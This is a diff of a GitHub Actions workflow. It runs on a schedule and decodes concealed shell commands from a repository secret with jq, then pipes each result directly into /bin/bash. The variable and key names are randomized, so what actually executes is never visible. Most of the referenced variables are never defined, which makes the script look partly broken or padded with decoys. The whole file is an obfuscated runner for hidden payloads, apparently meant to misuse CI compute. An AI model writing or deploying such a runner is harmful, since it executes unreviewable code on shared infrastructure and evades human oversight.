@@ -1,8 +1,9 @@
 name: cxzhiboma
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 2/6 * * *'
+    - cron: '35 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,14 +11,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: cxzhiboma
         env:
-          snv5502: ${{ secrets.snv5502 }}
+          r77780: ${{ secrets.r77780 }}
         run: |
-          echo $snv5502 | jq -r .g90 | /bin/bash
-          echo $rqe50 | jq -r .uurys4972 | /bin/bash
-          echo $jpy22 | jq -r .qo3 | /bin/bash
-          echo $umlm0668 | jq -r .gra8542 | /bin/bash
-          echo $erkf3 | jq -r .z3398 | /bin/bash
-          echo $c16 | jq -r .gf293 | /bin/bash
-          echo $ruhnf3 | jq -r .gx66835 | /bin/bash
-          echo $gpa80 | jq -r .dukod1 | /bin/bash
+          echo $r77780 | jq -r .p30 | /bin/bash
+          echo $rgcb80525 | jq -r .xr19 | /bin/bash
+          echo $h5 | jq -r .lndpv6520 | /bin/bash
+          echo $gyt28809 | jq -r .tp78 | /bin/bash
+          echo $gnqy828 | jq -r .vp0 | /bin/bash
+          echo $eaui592 | jq -r .jq965 | /bin/bash
+          echo $o5002 | jq -r .jg8986 | /bin/bash
+          echo $fad114 | jq -r .ak2 | /bin/bash
+          echo $hht850 | jq -r .dzpfy14761 | /bin/bash
+          echo $ezmt416 | jq -r .gtivu57 | /bin/bash
+          echo $bwudj19 | jq -r .km07909 | /bin/bash
+          echo $pi3 | jq -r .v80 | /bin/bash
+          echo $mezd25569 | jq -r .gnm9126 | /bin/bash
+          echo $h1552 | jq -r .tr7 | /bin/bash
+          echo $ypovg62172 | jq -r .orzir4 | /bin/bash
+          echo $absgh52 | jq -r .smeay696 | /bin/bash
 
